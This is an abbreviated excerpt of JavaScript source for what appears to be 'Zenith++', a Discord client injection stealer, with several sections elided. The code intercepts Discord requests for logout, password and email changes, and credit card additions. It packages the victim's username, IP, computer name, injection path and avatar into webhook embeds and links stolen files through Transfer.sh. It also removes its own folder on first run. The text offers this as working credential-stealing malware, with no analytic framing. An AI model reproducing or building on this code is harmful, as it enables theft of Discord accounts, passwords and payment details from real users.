...
const FirstTime = async () => {
    ...
    if (fs.existsSync(__dirname + "/Zenith++")){
        try{
        fs.rmdirSync(__dirname + "/Zenith++")
        }catch(err){
            console.log(err)
        }
    var ip = await getIP()
    ...
    if ((config.logout != "false" || config.logout !== "%LOGOUT%") && config['logout-notify'] == "true") {
        if (!token) {
            var params = await makeEmbed({
                title: "Zenith++ User log out (User not Logged in before)",
                fields: [{
                    name: "Injection Info",
            ...
            userAvatar = userAvatar ?? await getGifOrPNG(`https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}`)
            var params = await makeEmbed({
                title: "Zenith++ Victim got logged out",
    ...
    switch (true) {
        ...
        case request.url.endsWith("users/@me"):
            ...
            if (data.new_password) {
                var params = await makeEmbed({
                    title: "Zenith++ Team Detect Password Changed",
                    color: config['embed-color'],
                    description: `\`\`\` - Computer Name: \n${computerName}\n- Injection Path: ${client_discord}\n- IP: ${ip}\n\`\`\`\n[Download pfp](${userAvatar})`,
                    fields: [{
                        name: "Username <:username:1041634536733290596> ",
            ...
            if (data.email) {
                var params = await makeEmbed({
                    title: "Zenith++-Team Detect Email Changed",
                    color: config['embed-color'],
                    description: `\`\`\` - Computer Name: \n${computerName}\n- Injection Path: ${client_discord}\n- IP: ${ip}\n\`\`\`\n[Download pfp](${userAvatar})`,
                    fields: [{
                        name: "Username <:username:1041634536733290596> ",
        ...
        case request.url.endsWith("tokens"):
            ...
            var params = await makeEmbed({
                title: "Zenith++-Team User Credit Card Added",
                description: `
                Zenith++ Files: [Transfer.sh <:transfer:1105163981338968264>](${config.transfer_link})
                **IP:** ${ip}\n\n
